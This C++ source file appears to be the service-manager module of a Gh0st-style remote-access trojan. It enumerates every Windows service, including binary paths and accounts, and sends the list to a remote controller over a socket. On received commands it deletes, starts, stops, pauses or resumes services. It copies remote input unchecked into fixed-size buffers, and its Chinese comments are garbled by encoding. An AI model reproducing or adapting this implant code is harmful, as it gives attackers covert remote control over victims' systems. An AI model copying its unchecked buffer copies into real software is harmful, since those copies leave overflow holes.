// ServiceManager.cpp: implementation of the CServiceManager class.
//
//////////////////////////////////////////////////////////////////////

#include "ServiceManager.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CServiceManager::CServiceManager(CClientSocket *pClient) : CManager(pClient)
{
	SendServicesList();

}

CServiceManager::~CServiceManager()
{

}

void CServiceManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
 	switch (lpBuffer[0])
 	{
	case  SERVICE_WIN32:
		SendServicesList(SERVICE_WIN32);
		break;
	case  SERVICE_KERNEL_DRIVER:
		SendServicesList(SERVICE_KERNEL_DRIVER);
		break;
	case COMMAND_DELETESERVERICE:
		DeleteService((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_STARTSERVERICE:  //�������
		MyControlService((LPBYTE)lpBuffer + 1,0);
		break;
	case COMMAND_STOPSERVERICE:
		MyControlService((LPBYTE)lpBuffer + 1,1);
		break;
	case COMMAND_PAUSESERVERICE:
		MyControlService((LPBYTE)lpBuffer + 1,2);
		break;
	case COMMAND_CONTINUESERVERICE:
		MyControlService((LPBYTE)lpBuffer + 1,3);
		break;
	default:
		break;
	}
}

void CServiceManager::SendServicesList(DWORD dwScType)
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServiceList(dwScType);
	if (lpBuffer == NULL)
		return;	
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CServiceManager::getServiceList(DWORD dwScType)
{
	LPBYTE	 lpBuffer = NULL;
	DWORD	 dwOffset = 0;
	DWORD	 dwLength = 1024*8;
	char     strState[100], strStartType[100], lpDescription[1024];


	LPENUM_SERVICE_STATUS lpServices    = NULL; 
	SC_HANDLE sc = NULL; 
	SC_HANDLE sh;
	dwServiceType = dwScType;//SERVICE_WIN32 ;//SERVICE_KERNEL_DRIVER;  
	
	DWORD size=0;
	DWORD ret=0;
	
	char* szInfo[1024*8];
	DWORD dwSize=1024*8;
	
	sc=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	
	//��һ�ε������õ���Ҫ�����ڴ���
	EnumServicesStatus(sc,dwServiceType,SERVICE_STATE_ALL,lpServices,size,&size,&ret,NULL);
	//������Ҫ���ڴ�
	lpServices=(LPENUM_SERVICE_STATUS)LocalAlloc(LPTR,size);
	EnumServicesStatus(sc,dwServiceType,SERVICE_STATE_ALL,lpServices,size,&size,&ret,NULL);
	

	// ����Buffer�ڴ�
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_SERVICE_LIST;
	dwOffset = 1;

	for(DWORD i=0;i<ret;i++)
	{
		dwSize=1024*8;
		ZeroMemory(szInfo,dwSize);

		// ��ʾ��
//		puts(lpServices[i].lpDisplayName);
		
		sh=OpenService(sc,lpServices[i].lpServiceName,SERVICE_ALL_ACCESS);
		if(sh == NULL) //��ʧ��
			continue;
		
		QueryServiceConfig2(sh,SERVICE_CONFIG_DESCRIPTION,(LPBYTE)szInfo,dwSize,&dwSize);
		// ����
		memset(lpDescription,0,sizeof(lpDescription));
		if(((LPSERVICE_DESCRIPTION)szInfo)->lpDescription !=NULL)
			_tcscpy(lpDescription,((LPSERVICE_DESCRIPTION)szInfo)->lpDescription);
		

		// ״̬
		memset(strState,0,sizeof(strState));
		switch(lpServices[i].ServiceStatus.dwCurrentState)
		{
		case SERVICE_CONTINUE_PENDING:
			_tcscpy(strState,"Continue");
			break;
		case SERVICE_PAUSE_PENDING:
	    	_tcscpy(strState,"Pausing");
			break;
		case SERVICE_PAUSED:
			_tcscpy(strState,"Paused");
			break;
		case SERVICE_RUNNING:
			_tcscpy(strState,"Running");
			break;
		case SERVICE_START_PENDING:
			_tcscpy(strState,"Starting");
			break;
		case SERVICE_STOP_PENDING:
			_tcscpy(strState,"Stopping");
			break;
		case SERVICE_STOPPED:
			_tcscpy(strState,"Stopped");
			break;
        default:
			_tcscpy(strState,"Erro");
			break;
		}
	
		ZeroMemory(szInfo,dwSize);
		dwSize=1024*8;
		QueryServiceConfig(sh,(LPQUERY_SERVICE_CONFIG)szInfo,dwSize,&dwSize);

		// �������
		memset(strStartType,0,sizeof(strStartType));
		switch(((LPQUERY_SERVICE_CONFIG)szInfo)->dwStartType)
		{
		case SERVICE_AUTO_START:
			_tcscpy(strStartType,"Auto Start");
			break;
		case SERVICE_BOOT_START:
			_tcscpy(strStartType,"Boot Start");
			break;
		case SERVICE_DEMAND_START:
			_tcscpy(strStartType,"Demand Start");
			break;
		case SERVICE_DISABLED:
			_tcscpy(strStartType,"Disabled");
			break;
		case SERVICE_SYSTEM_START:
			_tcscpy(strStartType,"System Start");
			break;
		default:
			_tcscpy(strStartType,"Erro");
			break;
		}


		// ���������˻���
//		puts(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName);
		

		// �Ƿ������潻��
		char* InterActive = "";
		if(((LPQUERY_SERVICE_CONFIG)szInfo)->dwServiceType >= SERVICE_INTERACTIVE_PROCESS)
			InterActive = "��";

		// ������
//		puts(lpServices[i].lpServiceName);

		// ·��
//		puts(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName);

//==========================================================================================
		// ������̫С�������·�����
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


		// ��ʾ����
		memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, _tcslen(lpServices[i].lpDisplayName) + 1);
		dwOffset += _tcslen(lpServices[i].lpDisplayName) + 1;

		// ����
		memcpy(lpBuffer + dwOffset,lpDescription, _tcslen(lpDescription) + 1);
		dwOffset += _tcslen(lpDescription) + 1;

		// ״̬
		memcpy(lpBuffer + dwOffset, strState, _tcslen(strState) + 1);
		dwOffset += _tcslen(strState) + 1;

		// �������
		memcpy(lpBuffer + dwOffset, strStartType, _tcslen(strStartType) + 1);
		dwOffset += _tcslen(strStartType) + 1;

		// ��½���
		memcpy(lpBuffer + dwOffset, ((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName, _tcslen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName) + 1);
		dwOffset += _tcslen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpServiceStartName) + 1;

		// ���潻��
		memcpy(lpBuffer + dwOffset, InterActive, _tcslen(InterActive) + 1);
		dwOffset += _tcslen(InterActive) + 1;

		// ������
		memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, _tcslen(lpServices[i].lpServiceName) + 1);
		dwOffset += _tcslen(lpServices[i].lpServiceName) + 1;

		// ��ִ���ļ�·��
		memcpy(lpBuffer + dwOffset, ((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName, _tcslen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName) + 1);
		dwOffset += _tcslen(((LPQUERY_SERVICE_CONFIG)szInfo)->lpBinaryPathName) + 1;

		// ����֪ͨ

		CloseServiceHandle(sh);
	}
	
	CloseServiceHandle(sc);		

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

						
void CServiceManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //ɾ������
{
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	
	char temp[500];
	char *ServerName=NULL;
	_tcscpy(temp,(char*)(lpBuffer));
	ServerName = temp;
	DWORD _err = 0;
    service=OpenService(scm,ServerName,SERVICE_ALL_ACCESS);
	
	_err = GetLastError();
    BOOL isSuccess=QueryServiceStatus(service,&status);
	
    if ( status.dwCurrentState!=SERVICE_STOPPED )
	{
		isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
	}
	isSuccess=::DeleteService(service);
	CloseServiceHandle(service );
	CloseServiceHandle(scm);
	
	// ����Sleep�£���ֹ����
	Sleep(100);
	SendServicesList(dwServiceType);
}

void CServiceManager::MyControlService(LPBYTE lpBuffer,UINT nType)  //��� ֹͣ����
{
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);  // �򿪷���������

	service=OpenService(scm,(char*)lpBuffer,SERVICE_ALL_ACCESS);  // ��www����
	
    BOOL isSuccess=QueryServiceStatus(service,&status);
	

	switch(nType)
	{
	case 0:
		if ( status.dwCurrentState==SERVICE_STOPPED )  //����ֹͣ״̬ ���������
		{
			isSuccess=StartService(service,NULL,NULL);
		}
		break;
	case 1:
		if ( status.dwCurrentState !=SERVICE_STOPPED )
		{
			isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
		}
		break;
	case 2:
		if(status.dwCurrentState == SERVICE_RUNNING)
		{
			isSuccess=ControlService(service,SERVICE_CONTROL_PAUSE,&status);
        }
		break;
	case 3:
		if(status.dwCurrentState == SERVICE_PAUSED)
		{
			isSuccess=ControlService(service,SERVICE_CONTROL_CONTINUE,&status);
        }
		break;
	}
	
	CloseServiceHandle(service );
	CloseServiceHandle(scm);
	
	// ����Sleep�£���ֹ����
	Sleep(100);
	SendServicesList(dwServiceType);
}

